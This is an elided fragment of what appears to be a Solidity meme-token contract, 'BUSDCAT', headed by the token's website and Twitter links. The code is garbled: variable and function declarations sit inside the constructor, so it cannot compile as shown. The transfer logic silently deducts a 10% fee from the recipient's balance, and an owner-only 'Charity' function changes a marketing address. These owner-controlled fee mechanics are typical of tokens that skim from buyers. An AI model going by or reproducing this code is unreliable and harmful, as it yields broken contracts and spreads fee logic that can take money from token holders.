...
𝗪𝗘𝗕𝗦𝗜𝗧𝗘
- https://busdcat.digital/

𝗧𝗪𝗜𝗧𝗧𝗘𝗥 

- https://twitter.com/BUSDCAT
...
contract BUSDCAT is Context, ERC20, Ownable {
  ...
  constructor() {
    ...
    uint256 public _rewardBUSDFee = 10; // 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
    uint256 private _previousliqFee = _rewardBUSDFee;

    uint256 public MaxAmount = 5 * 10**18 * 10**18 ;
    uint256 private _previousMaxAmounts = MaxAmount;

    function Charity(address Newmarketing) public onlyOwner {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _rewardBUSDFee);
